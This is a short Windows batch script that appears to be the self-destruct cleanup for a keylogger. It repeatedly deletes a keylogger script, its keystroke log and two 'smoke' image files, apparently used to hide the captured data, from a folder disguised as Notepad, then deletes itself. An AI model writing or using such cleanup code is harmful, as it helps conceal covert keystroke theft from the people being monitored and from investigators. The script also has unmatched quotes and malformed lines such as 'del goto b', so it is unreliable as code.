:a
if exist "C:\users\user\Documents\Notepad\keylogger.pyw" del "C:\users\user\Documents\Notepad\keylogger.pyw"
if exist "C:\users\user\Documents\Notepad\keylogger.pyw" goto a
:b
if exist "C:\users\user\Documents\Notepad\smoke.png" del "C:\users\user\Documents\Notepad\smoke.png

if exist "C:\users\user\Documents\Notepad\keylog.txt" del "C:\users\user\Documents\Notepad\keylog.txt

if exist "C:\users\user\Documents\Notepad\secret_smoke.png" del "C:\users\user\Documents\Notepad\secret_smoke.png"
if exist "C:\users\user\Documents\Notepad\smoke.png" del goto b
if exist "C:\users\user\Documents\Notepad\keylog.txt" del goto b
if exist "C:\users\user\Documents\Notepad\secret_smoke.png" goto b
del /F "C:\users\user\Documents\Notepad\elf_destruct.bat"
